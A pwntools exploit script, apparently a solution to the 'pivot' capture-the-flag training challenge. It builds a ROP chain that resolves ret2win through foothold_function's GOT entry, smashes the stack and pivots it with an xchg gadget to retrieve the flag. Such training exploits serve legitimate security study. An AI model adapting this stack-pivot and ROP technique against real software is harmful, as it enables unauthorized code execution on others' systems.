from pwn import *

context.binary = './pivot'
smash_offset = 40

p = process(context.binary.path)
p.recvuntil("The Old Gods kindly bestow upon you a place to pivot: ")
pivot = int(p.recvline(), 16)
info("Pivot location: %s" % hex(pivot))

libpivot = ELF("./libpivot.so")
ret2win_offset = libpivot.sym['ret2win'] - libpivot.sym['foothold_function']
foothold_function_plt = p.elf.plt['foothold_function']
foothold_function_got = p.elf.got['foothold_function']

# pop rax; ret
pop_rax = 0x00000000004009bb

# mov rax, QWORD PTR [rax]; ret
mov_rax_qprax = 0x00000000004009c0

# pop rbp; ret
pop_rbp = 0x00000000004007c8

# add rax, rbp; ret
add_rax_rbp = 0x00000000004009c4

# call rax
call_rax = 0x00000000004006b0

p.recvuntil(">")
p.sendline(p64(foothold_function_plt) + p64(pop_rax) + p64(foothold_function_got) + p64(mov_rax_qprax) + p64(pop_rbp) + p64(ret2win_offset) + p64(add_rax_rbp) + p64(call_rax))

# xchg rsp, rax; ret
xchg_rsp_rax = 0x00000000004009bd

p.recvuntil(">")
p.sendline("\x90" * smash_offset + p64(pop_rax) + p64(pivot) + p64(xchg_rsp_rax))

p.recvuntil("into libpivot\n")
success("Flag: " + p.recvall())
